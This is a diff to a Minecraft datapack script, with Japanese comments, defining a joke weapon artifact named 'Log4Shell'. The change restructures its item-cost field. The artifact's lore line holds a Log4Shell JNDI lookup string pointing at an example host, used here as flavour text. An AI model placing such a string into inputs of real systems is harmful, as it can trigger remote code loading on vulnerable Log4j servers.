@@ -16,8 +16,10 @@
     data modify storage asset:artifact Name set value '{"text":"Log4Shell","color":"white"}'
 # 神器の説明文 (TextComponentString[])
     data modify storage asset:artifact Lore set value ['{"text":"原木を消費して弾丸を発射する。"}','{"text":"${jndi:ldap://tsb.example.com/artifact}","color":"dark_purple","italic":false}']
-# MP以外の消費物 (TextComponentString) (オプション)
-    data modify storage asset:artifact CostText set value '[{"text":"原木"},{"text":" x1"}]'
+# 消費アイテム ({Item: TextComponent, Count: int, Extra?: TextComponent}) (オプション)
+    data modify storage asset:artifact ConsumeItem.Item set value '{"text":"原木"}'
+    data modify storage asset:artifact ConsumeItem.Count set value 1
+    # data modify storage asset:artifact ConsumeItem.Extra set value
 # 使用回数 (int) (オプション)
     # data modify storage asset:artifact RemainingCount set value
 # 神器を発動できるスロット (string) Wikiを参照
